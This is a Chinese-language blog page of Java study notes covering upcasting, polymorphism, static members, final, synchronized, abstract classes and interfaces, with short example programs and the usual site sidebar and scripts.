<h5 id="对象类型转换"><a href="#对象类型转换" class="headerlink" title="对象类型转换"></a>对象类型转换</h5><pre><code>如同数据类型的转换,对象也可以在一定范围内进行转换,由于子类具有父类的方法与属性,因此子类对象可以向上转化为父类对象(上转型对象)
 SuperClass spc = new SubClass(); //SubClass是SuperClass的子类,父类引用指向对象实例
SubClass sbc = new SuperClass(); //错误 因为父类不一定含有子类的属性与方法
</code></pre><h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><pre><code>方法重载与方法覆盖是是实现继承的基本手段。重载只是方法的名字相同,而参数(参数类型,参数个数),方法覆盖是指子类的方法名与父类的方法名完全相同(参数类型,个数,返回值类型),即在子类重写了父类的方法,这样就能使用相同的方法名实现不同的功能。

class Animal{
    public void enjoy(){

    }
}
class Cat extends Animal{
    public void enjoy(){
        System.out.println(&quot;Cat....&quot;);
    }
}
class Dog extends Animal{
    public void enjoy(){
        System.out.println(&quot;Dog....&quot;);
    }
}
public class Testpolymoph{

  public static void main(String[] args){
      Testpolymoph test = new Testpolymoph();
      Cat cat = new Cat();
      Dog dog = new Dog();
      test.myEnjoy(cat);
      test.myEnjoy(dog);
  }

  public void myEnjoy(Animal pet){
      pet.enjoy();
  }

}
</code></pre><p>运行结果:</p>
<pre><code>用一个enjoy()方法就实现了不同的对象所需的操作,即不修改程序代码就可以改变程序运行时所绑定的具体代码,让程序可以选择多个运行状态,这就是实现了多态型。(像是定义一个方法,传入的参数是不同的对象,然后执行不同对象相应的相同名的成员方法)
</code></pre><h3 id="非访问控制符"><a href="#非访问控制符" class="headerlink" title="非访问控制符"></a>非访问控制符</h3><pre><code>类定义的时候除了可以使用public,private,protected和默认来设置成员变量与成员方法的访问权限,还可以使用static,final,abstract来说明其特性。 
</code></pre><h4 id="static"><a href="#static" class="headerlink" title="static"></a>static</h4><h5 id="类变量"><a href="#类变量" class="headerlink" title="类变量"></a>类变量</h5><pre><code>被static修饰的成员变量或成员方法称为类变量(静态变量)和类方法(静态方法)。没有被static修饰的称为实例变量和实例方法。
实例变量依附于对象,不同实例变量占用不同的内存空间。类变量依附于类,占用公共空间,该类的每个实例对象共享同一变量的存储空间,每个对象对类变量的修改都会影响其他实例对象。
public class Student{
    public static void main(String[] args) {
      System.out.println(&quot;现在的人数:&quot;+AClass.personnum);
      AClass aClass1 = new AClass();
      AClass aClass2 = new AClass();
      System.out.println(&quot;现在的人数:&quot;+AClass.personnum);
      System.out.println(&quot;现在的人数:&quot;+aClass2.personnum);
    }
}
public class AClass {
  static int personnum = 100;

  public AClass() {
      personnum ++;
  }
}
</code></pre><p>输出结果:<br>    现在的人数:100<br>    现在的人数:102<br>    现在的人数:102<br>每次创建AClass的实例时,调用其构造方法使其personnum加1,因此personnum可以记录所产生的实例对象的个数。可通过类名(AClass.personnum)实例对象名(aClass2.personnum)访问变量。且每个对象对静态变量personnum的修改都会影响其他实例对象。</p>
<h5 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h5><pre><code>类方法的本质是该方法属于整个类,而不是某个实例,可以不创建实例,直接通过类名调用(AClass.add(1,1))。

类方法的特点：
    1.可直接调用,不需要创建实例对象,例如,Java Application的入口main()方法被声明为static类方法,不需要创建任何实例对象即可调用。
    2.类方法属于整个类,被调用时可能还没有创建任何实例对象实例,因此,类方法只能访问类变量,而不能直接访问实例变量或实例方法。
    3.类方法中不能使用this关键字,因为静态方法不属于任何一个实例。
</code></pre><p>eg:</p>
<pre><code>public class Student{
    public static void main(String[] args) {
        System.out.println(&quot;sum&quot;+AClass.sum(3, 1));
        //System.out.println(&quot;sub&quot;+AClass.sub(3,1));  会报错,不能直接调用实例方法
    }
}
public class AClass {
  //static int personnum = 100;
  int z = 3;

  public static int sum(int a,int b) {
      //return z; 会报错,因为类方法中只能使用类变量,不能使用实例变量。
      return a+b;
  }

  public int sub(int a,int b) {
      return a-b;
  }

}
</code></pre><h4 id="final"><a href="#final" class="headerlink" title="final"></a>final</h4><pre><code>final可以修饰类,成员变量,成员方法,被final修饰过类,变量,方法的均不允许继承或覆盖。
</code></pre><h5 id="final修饰类"><a href="#final修饰类" class="headerlink" title="final修饰类"></a>final修饰类</h5><pre><code>被final修饰过的类称为最终类,它不可能有子类。
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-08.09.58.52-image.png" alt="2019-01-08.09.58.52-image.png"></p>
<h5 id="final修饰方法"><a href="#final修饰方法" class="headerlink" title="final修饰方法"></a>final修饰方法</h5><blockquote>
<p>使用final方法的原因有两个。第一个原因是把方法锁定，以防任何继承类修改它的含义；第二个原因是效率。在早期的Java实现版本中，会将final方法转为内嵌调用。但是如果方法过于庞大，可能看不到内嵌调用带来的任何性能提升。在最近的Java版本中，不需要使用final方法进行这些优化了    </p>
</blockquote>
<p>因此,只有在想明确禁止该方法在子类中被覆盖的情况下才将方法设置为final。    </p>
<h5 id="final修饰变量"><a href="#final修饰变量" class="headerlink" title="final修饰变量"></a>final修饰变量</h5><h6 id="final修饰普通变量"><a href="#final修饰普通变量" class="headerlink" title="final修饰普通变量"></a>final修饰普通变量</h6><pre><code>被final修饰的变量称为常量,不允许修改
final int a = 3;a = 2;  //编译器会报错
</code></pre><h5 id="final修饰引用变量"><a href="#final修饰引用变量" class="headerlink" title="final修饰引用变量"></a>final修饰引用变量</h5><pre><code>当使用final修饰引用类型变量时，它仅仅保证他的地址不变，即一直引用同一个对象，但这个对象完全可以发生改变
</code></pre><h4 id="其他修饰符"><a href="#其他修饰符" class="headerlink" title="其他修饰符"></a>其他修饰符</h4><h5 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h5><pre><code>主要用于多线程程序的协调和同步,如果某个方法被该关键字修饰,意味着不管哪个县城运行到这个方法时,都要检查有没有线程正在用这个方法,若有,则要等到正在使用的线程结束后,再运行此线程,如无,则直接运行。
</code></pre><h3 id="抽象类与接口"><a href="#抽象类与接口" class="headerlink" title="抽象类与接口"></a>抽象类与接口</h3><h4 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h4><p>先了解以下抽象方法，抽象方法是一种特殊的方法:他只有声明,而没有具体的实现,由它的子类去实现。同时抽象类提供了继承的概念,它的出发点是为了继承,否则它也没有存在的意义<br>抽象方法的声明格式:<code>abstract void fun();</code>如果一个类含有抽象方法,则称这个类为抽象类。<br>定义:如果一个类中没有包含足够的信息来描述具体的对象,<br>格式:<code>abstract class 类名 extends 父类 implements 接口名</code><br>eg:</p>
<pre><code>public abstract class Animal {
    public abstract void cry();
}

public class Cat extends Animal{

    @Override
    public void cry() {
        System.out.println(&quot;喵喵&quot;);
    }
}

public class Dog extends Animal{

    @Override
    public void cry() {
        System.out.println(&quot;汪汪&quot;);
    }

}

public class Test {

    public static void main(String[] args) {
        Animal a1 = new Cat();
        Animal a2 = new Dog();

        a1.cry();
        a2.cry();
    }
</code></pre><p>结果:<br>    喵喵喵<br>    汪汪汪<br>代码定义了一个抽象类Animal,必须提供抽象方法cry(),猫,狗都是动物的子类,由于cry为抽象方法,所以Cat,Dog必须实现cry</p>
<h4 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h4><p>接口在Java中是一个抽象集合,是抽象方法的集合。用来建立类与类之间的协议,它所提供的仅仅是一种协议,没有具体的实现,实现该接口的实现类必须实现该接口的所有方法,通过使用implements,表示遵循某个特定的接口。<br>接口是抽象类的延伸,一个类可以实现多个接口,弥补了类不能多继承的缺陷,一般抽象类与接口配合使用,既可以保证数据安全性又可以实现多继承。<br>注意:接口的所有方法的访问权限被系统自动定义为public,实现接口的非抽象类必须实现该接口的所有方法    </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">P0rZ9</p>
              <p class="site-description motion-element" itemprop="description">找回当年那个被寄予厚望的自己</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">53</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">13</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">P0rZ9</span>

  
</div>












        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
